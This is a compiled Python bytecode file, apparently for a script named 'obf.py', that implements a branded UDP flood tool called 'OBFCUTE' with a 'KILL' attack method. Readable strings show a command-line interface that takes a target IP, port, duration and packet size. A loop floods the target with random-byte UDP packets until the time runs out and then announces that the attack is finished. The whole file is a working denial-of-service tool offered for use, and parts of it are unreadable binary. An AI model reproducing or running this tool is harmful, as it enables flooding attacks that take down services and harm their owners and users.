�
FMbbc        	   @   sX  d  d l  m  Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d Z e j	 d � d �  Z
 e d k rTe j d d	 � Z
 e
 j d
 d e d d
 �e
 j d d d e d d d d �e
 j d d d e d d d d �e
 j d d d e d d d d �e
 j �  Z y# e
 e j e j e j  e j � WqTe k
 rPd GHqTXn  d S(   i����(   t   timeN(   t   stdouts<  
[35m╔═══════════════════════════════════╗
[35m║      OBFCUTE  OFFICIAL TOOLS      ║
[35m║      SUPPORT:[1;33;40m JERZZY             [35m ║
[35m║      DEVELOPER:[1;33;40m NESOF            [35m ║
[35m║      TOOLS & METHOD:[1;33;40m NESOF       [35m ║
[35m║           USING METHOD:           ║
[35m║             - [91mKILL[35m -              ║
[35m╚═══════════════════════════════════╝
t   clearc         C   s?  | d  k r t d � } n  | d  k	 rB t d t d | � � } n  t j d d � } t j d j |  | � � t	 GHt j d � t j d j |  | � � t j d	 � t
 �  } t j t d
 | � � } t
 j
 t
 j t
 j � } xU t r5| p� t j d d � } t
 �  } | | | k  rPn  | j | |  | f � q� Wd GHd  S(   Nt   infi   i��  i<Z  id}  s,   ]2;OBFCUTE KILL ATTACK | IP: {} | PORT: {}s�   ╔═══════════════════════════════════════════════════════════════╗
s8   ║ [>]OBFCUTE ATTACK TO {}:{} METHOD USE: KILL     ║
s�   ╚═══════════════════════════════════════════════════════════════╝
i�  s   [92mAttack Finished(   t   Nonet   floatt   maxt   mint   randomt   randintR   t   writet   formatt   methodt   ttt   ost   urandomt   sockett   AF_INETt
   SOCK_DGRAMt   Truet   sendto(   t   ipt   portR    t   sizet   botst   startupt   sockt   endtime(    (    s   obf.pyt   attack   s(    

			t   __main__t   descriptions.   Usage: python obf.py <ip> <port> <time> <size>R   t   typet   helps   IP or domain to attack.s   -ps   --portt   defaults   Port number.s   -ts   --times   Time in seconds.s   -ss   --sizei   s   Size in bytes.s   Attack stopped.(   R    R
   t   argparseR   R   R   t   sysR   R   t   systemR   t   __name__t   ArgumentParsert   parsert   add_argumentt   strt   intR   t
   parse_argst   argsR   R   R   t   KeyboardInterrupt(    (    (    s   obf.pyt   <module>   s&   
	"""#

